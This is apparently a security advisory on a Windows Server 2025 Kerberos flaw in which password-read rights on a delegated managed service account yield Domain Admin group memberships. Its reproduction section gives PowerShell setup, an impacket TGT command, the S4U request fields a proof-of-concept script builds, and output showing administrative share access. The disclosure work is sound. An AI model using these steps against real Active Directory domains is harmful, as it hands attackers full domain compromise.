# DMSA S4U Privilege Escalation — Domain Admin via GroupMSAMembership

## Summary

A design-level vulnerability in Windows Server 2025's Delegated Managed Service Account (DMSA) feature allows a low-privilege domain user to escalate to full Domain Admin. A user with only `msDS-GroupMSAMembership` (password read access) on a DMSA that supersedes a privileged account can obtain Kerberos tickets containing the superseded account's full group memberships (Domain Admins, Enterprise Admins, Schema Admins), granting unrestricted administrative access to the domain.

## Affected Product

- **Product**: Windows Server 2025
- **Component**: `kdcsvc.dll` — KDC (Key Distribution Center) DMSA S4U code path
- **Function**: `KdcDmsaTgsReqWorker()`
- **Feature**: Delegated Managed Service Accounts (DMSA) — new in Server 2025
- **Feature flag**: `Feature_Servicing_KdcDmsaVerifyLink` (Stage 3 = enabled)

## Severity

**Critical** — Privilege escalation from any domain user to Domain Admin.

- **Attack complexity**: Low. Single Kerberos exchange + service ticket request.
- **Privileges required**: Low. Only `msDS-GroupMSAMembership` on a DMSA, which is the default attribute set for password retrieval — typically granted to service account operators.
- **User interaction**: None.
- **Scope**: Changed. Attacker gains access to all domain resources as Domain Admin / Enterprise Admin / Schema Admin.
- **CVSS 3.1 estimate**: 9.8 (Critical) — `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`

## Impact

An attacker with `GroupMSAMembership` on a DMSA that supersedes a privileged account (e.g., Administrator) can:

1. Access all administrative shares (ADMIN$, C$) on any domain controller
2. Perform DCSync (replicate all domain credentials including krbtgt)
3. Create/modify domain objects with Schema Admin rights
4. Execute arbitrary commands on domain controllers via WMI/PSEXEC
5. Achieve full and persistent domain compromise

The attack requires only a single DMSA S4U Kerberos exchange — no exploitation of additional vulnerabilities, no credential theft, and no lateral movement.

## Prerequisites

1. A Windows Server 2025 domain controller with the DMSA feature enabled (default in Server 2025)
2. A DMSA configured to supersede a privileged account (via `msDS-ManagedAccountPrecededByLink`)
3. A domain user with `msDS-GroupMSAMembership` on that DMSA
4. Network access to the domain controller (TCP 88 for Kerberos, TCP 445 for SMB)

Note: DMSA supersession of privileged accounts is a supported configuration. Microsoft documentation describes DMSAs as replacements for legacy service accounts, and superseding an Administrator-level account is a valid migration scenario.

## Root Cause

The KDC function `KdcDmsaTgsReqWorker()` in `kdcsvc.dll` handles DMSA S4U requests. When processing a TGS-REQ with `PA_S4U_X509_USER` (padata type 130) targeting a DMSA:

1. **Authorization check**: `KdcDmsaAuthzCheck()` calls `AuthzAccessCheck()` with mask `0x10` against the DMSA's `msDS-GroupMSAMembership` security descriptor. This correctly verifies the caller has password read access.

2. **PAC construction** (THE BUG): `KdcDmsaTgsReqWorker()` resolves the DMSA's `msDS-ManagedAccountPrecededByLink` to find the superseded account, then **copies the superseded account's full group memberships into the S4U ticket's PAC**. This includes:
   - Domain Admins (RID 512)
   - Enterprise Admins (RID 519)
   - Schema Admins (RID 518)
   - Group Policy Creator Owners (RID 520)
   - Administrator RID (500)

3. **Ticket issuance**: The S4U ticket is issued as a TGT (for `krbtgt/<realm>`), encrypted with the `krbtgt` key. It can be used to request service tickets that inherit the admin PAC.

The fundamental error is conflating **password read access** (`GroupMSAMembership`) with **authorization group inheritance**. A user who can read a DMSA's password should not automatically receive the superseded account's domain admin groups in their Kerberos tickets.

### Comparison: Regular TGT vs S4U Ticket PAC

| | Regular DMSA TGT (AS-REQ) | S4U Ticket (DMSA TGS-REQ) |
|---|---|---|
| **Groups** | RID 515 (Domain Computers) | RIDs 500, 512, 513, 515, 518, 519, 520 |
| **Admin SIDs** | None | Domain Admins, Enterprise Admins, Schema Admins, Administrator |
| **Flags** | forwardable, proxiable, renewable, initial | renewable, pre_authent, enc_pa_rep |
| **PAC origin** | DMSA account's own groups | Superseded Administrator's groups |

## Reproduction Steps

### Environment Setup (on the DC as Administrator)

```powershell
# 1. Create a low-privilege domain user
New-ADUser -Name "bob.marley" -SamAccountName "bob.marley" `
  -UserPrincipalName "bob.marley@cve.local" `
  -AccountPassword (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force) `
  -Enabled $true

# 2. Create a DMSA that supersedes Administrator
#    -PrincipalsAllowedToRetrieveManagedPassword grants GroupMSAMembership
New-ADServiceAccount -Name TestDMSA05 `
  -DNSHostName TestDMSA05.cve.local `
  -CreateDelegatedManagedServiceAccount `
  -ManagedAccountPrecededByLink "CN=Administrator,CN=Users,DC=cve,DC=local" `
  -PrincipalsAllowedToRetrieveManagedPassword "bob.marley"
```

### Exploitation (from any domain-joined or network-accessible machine)

```bash
# Run the proof-of-concept
python3 poc_dmsa_privesc.py \
  --target-ip <DC_IP> \
  --domain <domain> \
  --dc-host <DC_FQDN> \
  -u bob.marley \
  -p 'P@ssw0rd!' \
  --dmsa TestDMSA05 \
  -v
```

### Manual Reproduction Steps

**Step 1** — Authenticate as the low-privilege user:
```bash
# Get TGT for bob.marley (standard AS-REQ)
impacket-getTGT cve.local/bob.marley:'P@ssw0rd!' -dc-ip 192.168.15.138
```

**Step 2** — Send DMSA S4U TGS-REQ:
```
No standard tool exists for this step. The PoC script constructs:
  - TGS-REQ with PA_TGS_REQ (type 1) + PA_S4U_X509_USER (type 130)
  - S4UUserID.cname = TestDMSA05$, crealm = CVE.LOCAL
  - S4UUserID.options = UNCONDITIONAL_DELEGATION | SIGN_REPLY
  - sname = krbtgt/CVE.LOCAL (requests a TGT-like ticket)

The KDC responds with a TGS-REP containing:
  - A ticket for krbtgt/CVE.LOCAL with Administrator's SIDs in the PAC
  - KERB_DMSA_KEY_PACKAGE (type 171) with the DMSA's encryption keys
```

**Step 3** — Request CIFS service ticket using the S4U ticket as TGT:
```
The PoC constructs a TGS-REQ:
  - AP-REQ wrapping the S4U ticket from Step 2
  - sname = cifs/<DC_FQDN>
  - KDC options: renewable, canonicalize (NOT forwardable — critical)

The KDC copies the admin PAC into the new service ticket.
```

**Step 4** — Authenticate to SMB with the admin-PAC service ticket:
```
The PoC passes the CIFS service ticket directly to impacket's
SMBConnection.kerberosLogin() as a TGS dict:
  {'KDC_REP': raw_bytes, 'cipher': AES256, 'sessionKey': Key}

With user='TestDMSA05$' and domain='CVE.LOCAL' (must match ticket exactly).
```

**Step 5** — Access ADMIN$ and C$ shares (proof of Domain Admin):
```
SMB TreeConnect to ADMIN$ → STATUS_SUCCESS
SMB TreeConnect to C$     → STATUS_SUCCESS
Directory listing of C:\  → confirms full filesystem access
```

### Observed Output

```
[*] STEP 1: Authenticate as bob.marley (low-privilege attacker)
[+] TGT acquired for bob.marley@CVE.LOCAL

[*] STEP 2: Send DMSA S4U request for TestDMSA05$
[+] TGS-REP received — S4U ticket with admin PAC
[+] KERB_DMSA_KEY_PACKAGE (type 171) received — DMSA keys extracted

[*] STEP 3: Request cifs/WIN-ABJPAOHJURR.cve.local service ticket using S4U TGT
[+] Service ticket for cifs/WIN-ABJPAOHJURR.cve.local obtained

[*] STEP 4: Prove Domain Admin access via SMB
[+] SMB Kerberos authentication SUCCEEDED
[+] Available shares: ADMIN$, C$, IPC$, NETLOGON, SYSVOL
[!] ADMIN$: ACCESSIBLE — DOMAIN ADMIN CONFIRMED
[!] C$: ACCESSIBLE — DOMAIN ADMIN CONFIRMED
[+] C:\ directory listing:
[+]   [DIR ] $Recycle.Bin
[+]   [FILE] DumpStack.log.tmp
[+]   [DIR ] Program Files
[+]   [DIR ] Windows
    ...
```

### PAC Evidence (via describeTicket with krbtgt AES key)

**Regular DMSA TGT** (AS-REQ with DMSA's own AES key):
```
GroupIds:
  S-1-5-21-<domain>-515  (Domain Computers)
ExtraSids:
  S-1-18-1  (Authentication Authority Asserted Identity)
```

**S4U Ticket** (DMSA S4U TGS-REQ from bob.marley):
```
GroupIds:
  S-1-5-21-<domain>-515  (Domain Computers)
  S-1-5-21-<domain>-513  (Domain Users)
  S-1-5-21-<domain>-512  (Domain Admins)          ← INJECTED
  S-1-5-21-<domain>-520  (Group Policy Creator)    ← INJECTED
  S-1-5-21-<domain>-518  (Schema Admins)           ← INJECTED
  S-1-5-21-<domain>-519  (Enterprise Admins)       ← INJECTED
  S-1-5-21-<domain>-500  (Administrator)           ← INJECTED
ExtraSids:
  S-1-18-1  (Authentication Authority Asserted Identity)
```
